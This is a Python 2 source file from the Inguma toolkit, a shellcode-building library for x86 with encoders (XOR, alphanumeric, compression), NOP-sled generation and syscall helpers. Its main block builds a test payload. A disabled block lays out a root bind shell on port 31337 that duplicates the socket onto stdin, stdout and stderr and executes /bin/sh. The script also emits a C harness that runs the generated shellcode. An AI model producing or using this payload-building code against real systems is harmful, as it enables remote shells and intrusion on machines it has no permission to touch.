#!/usr/bin/python

"""
PyShellCode library for Inguma Version 0.0.2
A library to write shellcodes coding in python.
Copyright (c) 2006, 2007 Joxean Koret, joxeankoret [at] yahoo.es

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; version 2
of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
"""

import sys
import binascii

class PyEgg:

    osType = None
    processor = None
    buf = ""
    internal = None
    encoder = None

    badChars = []
    ids = 0
    generator = None

    def __init__(self, mOsType="linux", mProcessor="x86", mIds = 0):
        self.osType = mOsType.lower()
        self.processor = mProcessor.lower()
        self.ids = mIds

        if not self.osType.isalnum() or not self.processor.isalnum():
            print "ERROR: Unacceptable module %s.%s" % (self.osType, self.processor)
            raise

        # FIXME: Horrible hack(s)!
        module = "import %s.%s as internal" % (self.processor, self.osType)
        exec(module)

        module = "import %s.encoder as encoder" % self.processor
        exec(module)

        self.internal = internal
        self.encoder = encoder
        self.generator = internal.CBaseShellcode()
        self.generator.ids = self.ids

    def alphaEncode(self):
        self.buf = self.encoder.alphaEncode(self.buf)

    def xorEncode(self, avoid="\x00"):
        self.buf = self.encoder.xorEncode(self.buf, avoid)

    def stackRelocEncode(self, smart=1):
        self.buf = self.encoder.stackRelocEncode(self.buf, smart=1)

    def compressEncode(self, histo='5', length='2'):
        self.buf = self.encoder.compressEncode(self.buf, histo, length)

    def getNops(self, size):
        return self.generator.nop(size, self.badChars)

    def getShellcode(self):
        ret = ""
        for c in self.buf:
            ret += chr(92) + "x" + binascii.b2a_hex(c)

        return ret

    def getEgg(self):
        return self.buf

    def appendNops(self, size):
        self.buf += self.getNops(size)

    def setuid(self, mid = 0):
        self.buf += self.generator.setuid(mid)

    def setgid(self, mid = 0):
        self.buf += self.generator.setgid(mid)

    def socket(self, adomain, atype, aprotocol=0):
        self.buf += self.generator.socket(adomain, atype, aprotocol)

    def bind(self, aport):
        self.buf += self.generator.bind(aport)

    def listen(self, abacklog=1):
        self.buf += self.generator.listen(abacklog)

    def accept(self):
        self.buf += self.generator.accept()

    def exit(self, retvalue=0):
        self.buf += self.generator.exit(retvalue)

    def close(self, fd=0):
        self.buf += self.generator.close(fd)

    def dup2(self, fd=0):
        self.buf += self.generator.dup2(fd)

    def execSh(self):
        self.buf += self.generator.execSh()

if __name__ == "__main__":

    import socket

    #a = PyEgg("openbsd")
    #a = PyEgg("macosx")
    a = PyEgg("linux")
    gen = a.generator

    a.buf += gen.setEax(chr(82))
    a.buf += gen.movEaxEcx()
    a.buf += gen.movEaxEbx()
    a.buf += gen.movEbxEdx()
    a.buf += gen.call("setuid")

    a.buf += gen.jmpTo(3)
    a.buf += gen.nop(2)

    a.buf += gen.xorEax()
    a.buf += gen.xorEbx()
    a.buf += gen.xorEcx()
    a.buf += gen.xorEdx()
    a.buf += gen.call("exit")

    """
    # Change to user root
    a.setuid(0)
    a.setgid(0)

    # Listen in all available addresses at port 31337
    a.socket(socket.AF_INET, socket.SOCK_STREAM)
    a.bind(31337)
    a.listen()

    # Got a connection, duplicate fd descriptors
    a.accept()
    a.dup2(2)
    a.dup2(1)
    a.dup2(0)

    # Uncomment to append 101 characters (NOPS)
    #a.appendNops(101)

    # Run /bin/sh
    a.execSh()
    a.exit(0)

    """
    sc = a.getShellcode()

    sys.path.append("../")
    sys.path.append("../../")
    from lib.libdisassemble.disassemble import Opcode

    print "#include <stdio.h>"
    print
    print 'char *sc="%s";' % sc
    print 
    print "/** Disassembly"
    print "*"

    if len(sys.argv) > 1:
        FORMAT=sys.argv[1].upper()
    else:
        FORMAT = "AT&T"

    offset = 0
    buf = a.getEgg()

    while offset < len(buf):
        try:
                        p=Opcode(buf[offset:])

                        print "* %08X:   %s" % (offset, p.printOpcode(FORMAT))
                        offset+=p.getSize()
        except:
            break

    print "*"
    print "*/"
    print
    print "int main(void) {"
    print "\t((void(*)())sc)();"
    print "}"
    print

